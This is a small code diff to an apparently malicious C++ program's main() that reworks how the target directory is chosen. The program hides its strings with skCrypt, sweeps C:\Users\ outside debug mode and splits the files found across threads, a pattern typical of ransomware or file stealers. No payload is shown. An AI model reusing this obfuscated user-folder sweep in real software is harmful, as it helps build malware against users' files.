@@ -66,11 +66,12 @@ int main(int argc, char* argv[])
     if (!DEBUG)
         dir = (string)skCrypt("C:\\Users\\");
     else {
-        dir = DEBUG_FOLDER;
-        if (argc < 2 && FileExists(DEBUG_FOLDER))
+        if (argc > 1)
+            dir = argv[1];
+        else if (FileExists(DEBUG_FOLDER))
             dir = DEBUG_FOLDER;
         else
-            dir = argv[1];
+            dir = (string)skCrypt(".\\");
     }
 
     vector<vector<string>> filesSplitted = VectorSplitter(GetFiles(dir), MAX_THREADS);
